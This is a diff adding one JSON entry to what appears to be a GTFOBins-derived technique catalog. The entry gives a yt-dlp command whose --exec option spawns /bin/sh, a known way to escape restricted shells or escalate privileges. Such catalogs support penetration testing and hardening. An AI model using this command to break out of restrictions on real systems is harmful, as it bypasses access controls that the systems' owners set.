@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-yt-dlp-shell",
+  "name": "GTFOBins · yt-dlp (shell)",
+  "command": "yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'",
+  "description": "Use yt-dlp to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "yt-dlp",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/yt-dlp/#shell",
+  "upstream_id": "yt-dlp/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/yt-dlp/"
+    }
+  ]
+}
